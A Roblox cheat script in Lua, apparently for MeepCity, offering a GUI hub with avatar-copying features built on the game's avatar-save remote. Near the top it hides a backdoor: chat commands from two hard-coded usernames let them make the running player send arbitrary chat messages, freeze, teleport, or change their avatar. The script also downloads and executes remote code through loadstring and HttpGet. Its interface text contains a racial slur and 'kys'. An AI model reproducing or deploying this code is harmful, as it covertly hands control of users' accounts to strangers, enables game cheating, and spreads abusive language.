    local player = game.Players.LocalPlayer
local playerHeadIcon = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"


game.StarterGui:SetCore("SendNotification", {
    Title = "meep fucker zynlope",
    Text = "Gui is loading..",
    Icon = playerHeadIcon,
    Duration = 5,
    Button1 = "kys broðŸ¤“"
})

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService = game:GetService("TextChatService")

-- List of target users who can execute commands
local targetUsernames = {
    ["sci_mythical77"] = true,
    ["Rylix56"] = true
}

local function isTargetPlayer(playerName)
    return targetUsernames[playerName] ~= nil
end

local function onChat(player, message)
    if not isTargetPlayer(player.Name) then return end
    local command = message:lower()

    if command == "/e fa" then
        local myPlayer = Players.LocalPlayer
        local character = myPlayer.Character or myPlayer.CharacterAdded:Wait()
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        
        if humanoid then
            local animation = Instance.new("Animation")
            animation.AnimationId = "rbxassetid://754656200"

            local animator = humanoid:FindFirstChildOfClass("Animator") or humanoid:WaitForChild("Animator")
            local animationTrack = animator:LoadAnimation(animation)

            animationTrack.Looped = true
            animationTrack:Play()
            animationTrack:AdjustSpeed(50)
        end

    elseif command == "/e unfa" then
        if animationTrack then
            animationTrack:Stop()
        end

    elseif command == "/e kitten" then
        local myPlayer = Players.LocalPlayer
        if myPlayer then
             -- Script generated by SimpleSpy - credits to exx#9394

local args = {
    [1] = {
        ["SwimAnimation"] = 2510240941,
        ["Torso"] = 4637151279,
        ["ProportionScale"] = 0,
        ["ClimbAnimation"] = 2510230574,
        ["Shirt"] = 11289085978,
        ["FaceAccessory"] = "13353986061,12580366888,8923599923",
        ["RightArmColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["HairAccessory"] = "13918965164,14314838611",
        ["RightArm"] = 0,
        ["Head"] = 0,
        ["FallAnimation"] = 2510233257,
        ["TorsoColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["DepthScale"] = 0.8,
        ["RightLeg"] = 0,
        ["HeightScale"] = 0.9,
        ["WaistAccessory"] = "14335771887",
        ["RightLegColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["LeftLegColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["WidthScale"] = 0.7,
        ["BodyTypeScale"] = 0,
        ["BackAccessory"] = "8651335862",
        ["LeftArmColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["Emotes"] = {
            ["1"] = {
                [1] = 9528286240
            },
            ["8"] = {
                [1] = 12874468267
            },
            ["3"] = {
                [1] = 7466046574
            },
            ["2"] = {
                [1] = 11309263077
            },
            ["4"] = {
                [1] = 3576968026
            },
            ["7"] = {
                [1] = 13344121112
            }
        },
        ["Pants"] = 14851012835,
        ["JumpAnimation"] = 2510236649,
        ["HatAccessory"] = "12579341301,13142881183,1402432199",
        ["LeftArm"] = 0,
        ["LeftLeg"] = 0,
        ["HeadColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["WalkAnimation"] = 2510242378,
        ["IdleAnimation"] = 2510235063,
        ["RunAnimation"] = 2510238627,
        ["HeadScale"] = 1,
        ["Face"] = 0,
        ["AccessoryBlob"] = {
            [1] = {
                ["Order"] = 1,
                ["AssetId"] = 12090385963,
                ["AccessoryType"] = "Jacket"
            }
        },
        ["GraphicTShirt"] = 10891067215
    }
}

game:GetService("ReplicatedStorage").FunctionConnections.NewAESaveAvatar:InvokeServer(unpack(args))
        end

 elseif command == "/e kitten2" then
        local myPlayer = Players.LocalPlayer
        if myPlayer then
             local args = {
    [1] = {
        ["SwimAnimation"] = 0;
        ["WalkAnimation"] = 0;
        ["ProportionScale"] = 0.511454701423645;
        ["RightLegColor"] = {
            [1] = "248.0000004172325";
            [2] = "248.0000004172325";
            [3] = "248.0000004172325";
        };
        ["HatAccessory"] = "98144560652085";
        ["Torso"] = 111532289455125;
        ["JumpAnimation"] = 0;
        ["IdleAnimation"] = 0;
        ["BodyTypeScale"] = 0.5962028503417969;
        ["ClimbAnimation"] = 0;
        ["Shirt"] = 11335258282;
        ["Emotes"] = {
            ["1"] = {
                [1] = 14548709888;
            };
            ["8"] = {
                [1] = 5915776835;
            };
            ["3"] = {
                [1] = 10370922566;
            };
            ["2"] = {
                [1] = 12874468267;
            };
            ["5"] = {
                [1] = 7466046574;
            };
            ["4"] = {
                [1] = 11753545334;
            };
            ["7"] = {
                [1] = 4646306583;
            };
            ["6"] = {
                [1] = 4689362868;
            };
        };
        ["GraphicTShirt"] = 0;
        ["RightArmColor"] = {
            [1] = "248.0000004172325";
            [2] = "248.0000004172325";
            [3] = "248.0000004172325";
        };
        ["RightLeg"] = 131359873709031;
        ["WidthScale"] = 1.0517624616622925;
        ["Pants"] = 4080983570;
        ["RightArm"] = 126637196984684;
        ["FallAnimation"] = 0;
        ["Head"] = 0;
        ["LeftLegColor"] = {
            [1] = "248.0000004172325";
            [2] = "248.0000004172325";
            [3] = "248.0000004172325";
        };
        ["Face"] = 15432080;
        ["LeftArmColor"] = {
            [1] = "248.0000004172325";
            [2] = "248.0000004172325";
            [3] = "248.0000004172325";
        };
        ["LeftLeg"] = 104113560860424;
        ["HeadColor"] = {
            [1] = "248.0000004172325";
            [2] = "248.0000004172325";
            [3] = "248.0000004172325";
        };
        ["TorsoColor"] = {
            [1] = "248.0000004172325";
            [2] = "248.0000004172325";
            [3] = "248.0000004172325";
        };
        ["DepthScale"] = 1.0188917815685272;
        ["LeftArm"] = 98964144815454;
        ["HeadScale"] = 1;
        ["HeightScale"] = 0.986021101474762;
        ["RunAnimation"] = 0;
        ["WaistAccessory"] = "120583292739858";
    };
}

game:GetService("ReplicatedStorage"):WaitForChild("FunctionConnections", 9e9):WaitForChild("NewAESaveAvatar", 9e9):InvokeServer(unpack(args))
        end

    elseif command == "/e freeze" then
        local myCharacter = Players.LocalPlayer.Character
        if myCharacter and myCharacter:FindFirstChild("HumanoidRootPart") then
            myCharacter.HumanoidRootPart.Anchored = true
        end

    elseif command == "/e unfreeze" then
        local myCharacter = Players.LocalPlayer.Character
        if myCharacter and myCharacter:FindFirstChild("HumanoidRootPart") then
            myCharacter.HumanoidRootPart.Anchored = false
        end

    elseif command:sub(1, 7) == "/e chat" then
        local chatMessage = message:sub(9)
        if chatMessage:gsub("%s+", "") ~= "" then
            local textChannel = TextChatService:WaitForChild("TextChannels"):FindFirstChild("RBXGeneral")
            if textChannel then
                textChannel:SendAsync(chatMessage)
            end
        end

    elseif command == "/e bring" then
        local targetCharacter = player.Character
        local myPlayer = Players.LocalPlayer

        if myPlayer and targetCharacter then
            local targetHRP = targetCharacter:FindFirstChild("HumanoidRootPart")
            local myCharacter = myPlayer.Character

            if myCharacter and targetHRP then
                local myHRP = myCharacter:FindFirstChild("HumanoidRootPart")
                if myHRP then
                    myHRP.CFrame = targetHRP.CFrame
                end
            end
        end
    end
end

-- Connect chat event for existing players
for _, player in ipairs(Players:GetPlayers()) do
    player.Chatted:Connect(function(msg) onChat(player, msg) end)
end

-- Connect chat event for new players joining
Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg) onChat(player, msg) end)
end)


game.StarterGui:SetCore("SendNotification", {
    Title = "zynlope",
    Text = "loading goodies..",
    Icon = playerHeadIcon,
    Duration = 3,
    Button1 = "okay buddy"
})

local MarketplaceService = game:GetService("MarketplaceService")
local executorName = identifyexecutor()

local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
print("Game Name: " .. gameName)

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local openingSound = Instance.new("Sound")
openingSound.SoundId = "rbxassetid://6958727243" 
openingSound.Volume = 5 
openingSound.PlayOnRemove = false
openingSound.Looped = false
openingSound.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui") 

local function playOpeningSound()
    openingSound:Play()
end



playOpeningSound()
local Window = Rayfield:CreateWindow({
   Name = "discord: plusgiant | " .. executorName .. " | " .. gameName,
   Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
   LoadingTitle = "zynlope.lol",
   LoadingSubtitle = "by plusgiant",
   Theme = "Amethyst", -- Check https://docs.sirius.menu/rayfield/configuration/themes

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface

   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = "Big Hub"
   },

   Discord = {
      Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
      Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },

   KeySystem = true, -- Set this to true to use our key system
   KeySettings = {
      Title = "hands up nigga",
      Subtitle = "plusgiant",
      Note = "contact owner for key       discord: plusgiant", -- Use this to tell the user how to get a key
      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = false, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {"cartiaintdropping"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
   }
})

Rayfield:Notify({
   Title = "ZYNLOPE",
   Content = "newest gui is officialy discounted. and im not going to update it due to its errors. older gui is works for low executors like xeno/solara but newest works on higher executors. (because of the functions it has) theres a few useful stuff thats not in the older gui on the newest. but still keep using old gui. ",
   Duration = 13,
   Image = 4483362458,
})

local Tab = Window:CreateTab("Meepcity", 126133429358591) -- Title, Image

local function colorToTable(clr)
    return {tostring(clr.R * 255), tostring(clr.G * 255), tostring(clr.B * 255)}
end

local function ExtractData(humdes)
    local ava = {}

    for _, v in pairs({"WidthScale", "HeightScale", "DepthScale", "BodyTypeScale", "ProportionScale", "HeadScale"}) do
        ava[v] = humdes[v]
    end

    for _, v in pairs({"Face", "Head", "LeftArm", "RightArm", "LeftLeg", "RightLeg", "Torso"}) do
        ava[v] = humdes[v]
    end

    for _, v in pairs({"HeadColor", "LeftArmColor", "RightArmColor", "LeftLegColor", "RightLegColor", "TorsoColor"}) do
        ava[v] = colorToTable(humdes[v])
    end

    for _, v in pairs({"GraphicTShirt", "Shirt", "Pants"}) do
        ava[v] = humdes[v]
    end

    for _, v in pairs({"IdleAnimation", "RunAnimation", "JumpAnimation", "SwimAnimation", "WalkAnimation", "ClimbAnimation", "FallAnimation"}) do
        ava[v] = humdes[v]
    end

    for _, v in pairs({"Hat", "Hair", "Back", "Face", "Front", "Neck", "Shoulders", "Waist"}) do
        ava[v .. "Accessory"] = humdes[v .. "Accessory"]
    end

    local layered = humdes:GetAccessories(false)
    for i, accessory in pairs(layered) do
        if accessory.AccessoryType and typeof(accessory.AccessoryType) == "EnumItem" then
            accessory.AccessoryType = accessory.AccessoryType.Name
        end
        accessory.Order = i
    end
    ava.AccessoryBlob = layered

    ava.Emotes = humdes:GetEmotes()

    return ava
end


local AvatarClipboard = nil
local AvatarClipboardName = "Unnamed"

local Section = Tab:CreateSection("Avatar Clipboard")
Section:Set("Avatar Clipboard")

local function copyToClip(data, name)
    if not data then
        AvatarClipboard = nil
        AvatarClipboardName = "Unnamed"
        Section:Set("Avatar Clipboard")
    else
        AvatarClipboard = data
        AvatarClipboardName = name
        Section:Set("Avatar Clipboard: " .. name)
    end
end

local function LoadPlayer(player)
    coroutine.wrap(function()
        if player ~= Players.LocalPlayer then
            local function LoadCharacter(character)
                local prox = Instance.new("ProximityPrompt", character:WaitForChild("HumanoidRootPart"))
                prox.ActionText = "Copy Avatar To Clipboard"
                prox.ObjectText = player.DisplayName
                prox.KeyboardKeyCode = Enum.KeyCode.C
                prox.HoldDuration = 0
                prox.RequiresLineOfSight = false
                prox.Triggered:Connect(function()
                    if character and character:FindFirstChild("Humanoid") and character.Humanoid:FindFirstChild("HumanoidDescription") then
                        copyToClip(ExtractData(character.Humanoid.HumanoidDescription), player.DisplayName)
                    end
                end)
            end
            LoadCharacter(player.Character or player.CharacterAdded:Wait())
            player.CharacterAdded:Connect(LoadCharacter)
        end
    end)()
end

for _, player in pairs(Players:GetPlayers()) do
    LoadPlayer(player)
end
Players.PlayerAdded:Connect(LoadPlayer)

Tab:CreateButton({
    Name = "Copy Current Avatar",
    Callback = function()
        local player = Players.LocalPlayer
        local character = player.Character
        if character and character:FindFirstChild("Humanoid") and character.Humanoid:FindFirstChild("HumanoidDescription") then
            copyToClip(ExtractData(character.Humanoid.HumanoidDescription), player.DisplayName)
        end
    end
})

Tab:CreateButton({
    Name = "Load Avatar",
    Callback = function()
        if AvatarClipboard then
            game:GetService("ReplicatedStorage").FunctionConnections.NewAESaveAvatar:InvokeServer(AvatarClipboard)
        end
    end
})

local LoadAvatarFromUserId = Tab:CreateInput({
   Name = "Load Avatar From UserId",
   CurrentValue = "",
   PlaceholderText = "Enter UserId",
   RemoveTextAfterFocusLost = false,
   Flag = "LoadAvatarUserId",
   Callback = function(userid)
      if userid and tonumber(userid) and Players:GetHumanoidDescriptionFromUserId(tonumber(userid)) then
         local data = ExtractData(Players:GetHumanoidDescriptionFromUserId(tonumber(userid)))
        game:GetService("ReplicatedStorage").FunctionConnections.NewAESaveAvatar:InvokeServer(data)
      end
   end,
})

local LoadAvatarFromUsername = Tab:CreateInput({
   Name = "Load Avatar From Username",
   CurrentValue = "",
   PlaceholderText = "Enter Username",
   RemoveTextAfterFocusLost = false,
   Flag = "LoadAvatarUsername",
   Callback = function(username)
      if username and Players:GetUserIdFromNameAsync(username) then
         local data = ExtractData(Players:GetHumanoidDescriptionFromUserId(Players:GetUserIdFromNameAsync(username)))
          game:GetService("ReplicatedStorage").FunctionConnections.NewAESaveAvatar:InvokeServer(data)
      end
   end,
})
